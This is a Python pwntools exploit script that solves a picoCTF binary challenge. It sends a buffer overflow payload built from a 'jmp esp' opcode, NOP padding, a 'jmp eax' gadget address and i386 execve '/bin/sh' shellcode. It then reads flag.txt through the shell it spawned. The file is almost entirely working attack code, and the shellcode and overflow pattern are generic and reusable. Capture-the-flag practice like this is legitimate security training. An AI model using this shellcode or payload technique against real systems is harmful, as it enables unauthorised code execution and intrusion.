#!/usr/bin/python3.8
from pwn import *
import warnings
warnings.filterwarnings('ignore')
context.arch = 'i386'

r = remote('saturn.picoctf.net', 58385)

sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

payload  = b'\xff\xe4' # jmp esp opcode
payload += b'\x90'*(0x1c - 2) 
payload += p32(0x0805333b) # jmp eax
payload += sc # our shellcode

r.sendline(payload)
pause(1)
r.recvline()
r.sendline('cat flag.txt')
success(f'Flag --> {r.recvuntil("}").strip().decode()}')